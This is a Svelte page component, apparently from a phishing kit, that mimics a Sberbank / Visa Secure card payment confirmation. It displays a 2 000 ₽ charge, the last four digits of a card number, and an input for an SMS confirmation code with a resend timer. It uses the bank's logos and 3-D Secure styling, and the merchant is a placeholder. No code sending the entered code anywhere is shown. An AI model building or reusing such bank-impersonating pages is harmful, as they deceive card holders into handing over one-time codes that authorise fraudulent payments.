<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="css/check/check.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</svelte:head>

<script>
    import { onMount } from "svelte";
    import { t, locale, locales } from "./../Translations/i18n.js";
    import {defineUserLanguage} from './../Helpers/Helper.js';
    export let number;
    let timerValue;
    const dateToday = new Date().toLocaleDateString();
    function timerInit(){
        timerValue = 19;
        const timerId = setInterval(() => {
            if(timerValue > 0)
                timerValue -= 1;
            else clearInterval(timerId);
        }, 1000)
    }
    timerInit();
    
    $: time = new Date().toLocaleDateString($locale, {
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric",
    });
    onMount(()=> { $locale = defineUserLanguage() });
</script>

<section>
    <div class="wraper">
        <select bind:value={$locale}>
            {#each locales as l}
                <option value={l}>{l}</option>
            {/each}
        </select>
        <div class="logo">
            <img src="img/chek/sberbankLogo.png" alt="">
            <img src="img/chek/visasecure.png" alt="">
        </div>
        <div class="info">
            <div class="info__price">
                <h1>2 000 ₽</h1>
            </div>
            <div class="info__place">
                <p>{@html $t("check.store")}</p>
                <p>psp</p>
            </div>
            <div class="info__card">
                <p>{@html $t("check.number")}</p>
                <p>** {number.slice(number.length-4)}</p>
            </div>
            <div class="info__date">
                <p>{@html $t("check.date")}</p>
                <p>
                    {dateToday}
                </p>
            </div>
        </div>
        <div class="text">
            <h2>{@html $t("check.sendCode")}</h2>
            <p>{@html $t("check.sendConditions")}</p>
        </div>
        <div class="input-info">
            <p>{@html $t("check.enterCode")}</p>
            <input name="kod" class="" autocomplete="tel-country-code" pattern="[0-9]*" type="text">
            {#if timerValue > 0}
                <p>{@html $t("check.codeRequest")} <b> {timerValue} {@html $t("check.seconds")}</b></p>
            {:else}
                <button class="getNewCode"
                    on:click={timerInit}>запрос кода</button>
            {/if}
        </div>
        <div class="lock">
            <a href="checkBack.html">Отменить</a>
            <a href="">Безопасность</a>
        </div>
    </div>
</section>

<style>
    .getNewCode{
        width: 100%;
        height: 50px;
        margin-top: 8px;
        margin-bottom: 8px;
        border-radius: 4px;
    }
</style>